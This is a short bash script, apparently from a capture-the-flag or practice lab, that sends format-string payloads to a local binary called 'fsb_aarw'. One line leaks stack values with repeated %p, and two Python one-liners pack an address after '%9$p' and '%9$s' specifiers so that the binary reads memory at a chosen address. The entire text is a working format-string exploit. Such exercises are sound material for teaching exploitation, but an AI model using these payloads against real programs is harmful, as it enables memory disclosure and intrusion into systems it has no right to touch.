#!/bin/bash

echo 'aaaaaaaa %p %p %p %p %p %p %p %p %p' | ./fsb_aarw

python3 -c "import sys; import struct; sys.stdout.buffer.write(b'%9\$p'.ljust(8,b'\x00') + struct.pack('<Q', 0x404020))" | ./fsb_aarw; echo

python3 -c "import sys; import struct; sys.stdout.buffer.write(b'%9\$s'.ljust(8,b'\x00') + struct.pack('<Q', 0x404020))" | ./fsb_aarw | xxd
